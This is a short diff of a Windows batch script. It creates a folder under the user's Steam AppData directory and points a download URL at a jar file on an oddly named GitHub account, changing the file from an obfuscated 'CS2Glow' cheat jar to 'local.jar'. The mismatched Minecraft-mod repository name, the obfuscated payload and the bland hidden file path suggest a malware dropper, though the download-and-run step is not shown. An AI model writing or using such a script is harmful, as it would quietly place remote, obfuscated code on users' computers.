@@ -3,7 +3,7 @@ setlocal
 
 set "JAR_DIR=C:\Users\klobz\AppData\Local\Steam"
 set "JAR_PATH=%JAR_DIR%\local.jar"
-set "URL=https://raw.githubusercontent.com/edhjsertwasfvds/ModMinecraftJar1.2.8/main/CS2Glow_obf.jar"
+set "URL=https://raw.githubusercontent.com/edhjsertwasfvds/ModMinecraftJar1.2.8/main/local.jar"
 
 if not exist "%JAR_DIR%" mkdir "%JAR_DIR%"
 
